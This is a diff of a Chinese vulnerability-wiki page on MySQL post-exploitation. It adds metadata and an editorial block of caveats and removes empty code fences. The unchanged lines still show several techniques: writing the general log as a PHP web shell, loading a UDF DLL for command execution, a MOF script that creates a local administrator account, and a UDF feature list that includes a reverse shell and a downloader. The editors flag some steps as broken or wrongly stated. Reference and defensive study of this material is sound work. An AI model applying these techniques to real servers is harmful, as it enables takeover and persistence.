@@ -1,9 +1,60 @@
 ---
 version: "`show variables like 'general_log';    查看日志是否开启``set global general_log=on;    开"
 source: "MrWQ/vulnerability-paper"
+title: "终极MySQL数据库利用姿势"
+product: "MySQL 与 Windows/PHP 部署"
+record_type: "roundup"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+identifier_status: "unknown"
+primary_identifiers: ""
+referenced_identifiers: ""
+identifier_role: "unknown"
+prerequisites: "各链需独立列SQL权限、OS写权限、plugin_dir、secure_file_priv、Web解析或旧Windows条件"
+affected_versions: "`show variables like 'general_log';    查看日志是否开启``set global general_log=on;    开"
+source_url: "https://mp.weixin.qq.com/s/QVC7PaEdVpLZCGdQXkcQIA"
+source_status: "recorded"
+side_effects: "含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。; 含落盘脚本或账户创建：会留下持久状态。记录本次生成的路径或账户，测试后清理这些对象并撤销关联令牌；不要删除既有业务对象。; 含资源消耗、延时或崩溃验证：可能影响服务可用性；限制请求次数、并发与超时，保留无攻击负载的对照结果。"
+id: "vw-2697f6dba45bbaab769b8a64"
+entity_id: "ve-2697f6dba45bbaab769b8a64"
+schema_version: "1"
 ---
 
 # 终极MySQL数据库利用姿势
+
+<!-- vulwiki-editorial:start -->
+## 校订与适用边界
+
+- 适用前提：各链需独立列SQL权限、OS写权限、plugin_dir、secure_file_priv、Web解析或旧Windows条件
+- 证据范围：完整读过全部技巧；主要是高权限后利用而非数据库通用漏洞，已有UDF文章应关联但保留有价值差异
+
+### 本次正文校订
+
+- 移除 7 组不含任何正文的空代码围栏；保留全部非空代码。
+
+### 尚未解决的证据缺口
+
+以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：
+
+- 大量代码被反引号/并行串联破坏，部分步骤仅留空白
+- 日志写Web目录并非Windows专属，也非所有高权限Apache可替代MySQL写权限
+- UDF路径先称lib后又plugin_dir，需以实际配置为准
+- set global variables like 是错误语法；secure_file_priv不等同load_file开关，默认值不能简单按5.5切割
+- MOF文称每5秒，但所给Second=5是每分钟第5秒；wbme路径拼错
+- 建议删除整个WMI Repository作为清理具有系统破坏风险，应改为仅回滚创建的过滤器/消费者/绑定等精确清理说明
+- assert字符串执行依赖旧PHP；缺相应版本条件
+
+### 操作风险与资料使用
+
+- 含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。
+- 含落盘脚本或账户创建：会留下持久状态。记录本次生成的路径或账户，测试后清理这些对象并撤销关联令牌；不要删除既有业务对象。
+- 含资源消耗、延时或崩溃验证：可能影响服务可用性；限制请求次数、并发与超时，保留无攻击负载的对照结果。
+
+本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
+<!-- vulwiki-editorial:end -->
+
+## 技术正文与历史材料
 
 <meta name="referrer" content="no-referrer"/>
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/QVC7PaEdVpLZCGdQXkcQIA)
@@ -66,10 +117,6 @@ show variables like 'log_output'; 查看日志输出类型 table或file
 set global general_log_file='D:/phpStudy/WWW/shell.php'; //设置日志文件保存位置
 ```
 
-```
-  
-
-```
 
 
 
@@ -207,10 +254,6 @@ show variables like'%plugin%';
 
 
 
-```
-  
-
-```
 
   
 
@@ -224,10 +267,6 @@ select load_file('D:\metasploit-framework\embedded\framework\data\exploits\mysql
 
 
 
-```
-  
-
-```
 
   
 
@@ -261,10 +300,6 @@ CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.dll';
 drop function sys_eval;
 ```
 
-```
-  
-
-```
 
 如果MySql在内网情况下，无法直连Mysql或者Mysql不允许外连，这个时候，可以使用一些网页脚本，比如udf.php，一键dump udf 。
 
@@ -308,10 +343,6 @@ drop function sys_eval;
 `#pragma namespace("\\\\\\\\.\\\\root\\\\subscription")``instance of __EventFilter as $EventFilter``{``EventNamespace = "Root\\\\Cimv2";``Name = "filtP2";``Query = "Select * From __InstanceModificationEvent "``"Where TargetInstance Isa \\"Win32_LocalTime\\" "``"And TargetInstance.Second = 5";``QueryLanguage = "WQL";``};``instance of ActiveScriptEventConsumer as $Consumer``{``Name = "consPCSV2";``ScriptingEngine = "JScript";``ScriptText =``"var WSH = new ActiveXObject(\\"WScript.Shell\\")\\nWSH.run(\\"net.exe user hpdoger 123456 /add\\")\\nWSH.run(\\"net.exe localgroup administrators hpdoger /add\\")";``};``instance of __FilterToConsumerBinding``{``Consumer = $Consumer;``Filter = $EventFilter;``};`
 ```
 
-```
-  
-
-```
 
 MOF文件利用:
 
@@ -337,10 +368,6 @@ _**cmd 下运行下面语句:**_
 `#停止winmgmt服务``net stop winmgmt``#删除 Repository 文件夹``rmdir /s /q C:\\Windows\\system32\\wbem\\Repository\\``# 手动删除 mof 文件``del c:/windows/system32/wbem/mof/nullevt.mof /F /S``# 删除创建的用户``net user hpdoger /delete``#重启服务``net start winmgmt`
 ```
 
-```
-  
-
-```
 
 **0x05 反弹端口提权** 
 
@@ -350,10 +377,6 @@ _**cmd 下运行下面语句:**_
 `cmdshell        执行cmd;``downloader     下载者,到网上下载指定文件并保存到指定目录;``open3389       通用开3389终端服务,可指定端口(不改端口无需重启);``backshell      反弹Shell;``ProcessView    枚举系统进程;``KillProcess    终止指定进程;``regread       读注册表;``regwrite      写注册表;``shut         关机,注销,重启;``about        说明与帮助函数;`‍
 ```
 
-```
-  
-
-```
 
 该动态链接库下载地址: udf.dll
 
